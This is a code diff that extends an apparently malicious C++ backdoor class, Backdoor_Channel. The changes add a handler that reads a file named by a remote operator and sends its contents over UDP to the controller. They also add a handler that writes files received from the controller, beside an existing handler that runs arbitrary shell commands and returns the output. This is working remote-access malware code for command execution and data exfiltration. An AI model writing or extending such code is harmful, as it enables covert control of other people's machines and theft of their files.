@@ -37,11 +37,14 @@ bool Backdoor_Channel::parse_command(Job& j){
 
 
     switch(cmd) {
-        case CMD::run_cmd :
-           handle_run_cmd(j);
-           break; //optional
+        case CMD::run_command :
+            handle_run_cmd(j);
+            break; //optional
+        case CMD::return_file :
+            handle_return_file(j);
+            break; //optional
         case CMD::get_file :
-            //handle_get_file(command_arg);
+            handle_get_file(j);
             break; //optional
         default :
             cout << "parse_command default switch case " << endl;
@@ -50,16 +53,44 @@ bool Backdoor_Channel::parse_command(Job& j){
     return true;
 }
 
+bool Backdoor_Channel::handle_get_file(Job& j){
+    string result, response;
+    std::vector<unsigned char> hidden_data;
+    cout << "ReadFile: " << '"' << j.argument << '"' << endl;
+    Utilities::readfile(j.argument, hidden_data);
+    response += '[';
+    response += cmdMap.left.find(CMD::return_file)->second;
+    response += ']';
+    response += '[';
+    response += j.argument;
+    response += ']';
+
+    int i =0;
+    for(auto& c : response){
+        hidden_data.insert(hidden_data.begin()+i, c);
+        i++;
+    }
+
+    cout << "response: \n" << response << endl;
+    cout << "ip: \n" << j.address.ip << "port:" << config.target_addr.port << endl;
+    udp_send(j.address.ip, config.target_addr.port, hidden_data);
+    return true;
+}
 
 bool Backdoor_Channel::handle_run_cmd(Job& j){
     string result, response;
     result = Utilities::execute(j.argument);
     response += '[';
-    response += cmdMap.left.find(CMD::ret_cmd)->second;
+    response += cmdMap.left.find(CMD::return_command)->second;
     response += ']';
     response += result;
     cout << "response: \n" << response << endl;
     cout << "ip: \n" << j.address.ip << "port:" << config.target_addr.port << endl;
     udp_send(j.address.ip, config.target_addr.port, std::vector<unsigned char>(response.begin(), response.end()));
     return true;
+}
+
+bool Backdoor_Channel::handle_return_file(Job& j){
+    split_command_argument_with_regex(j.argument, j);
+    Utilities::writefile(j.command, j.argument);
 }
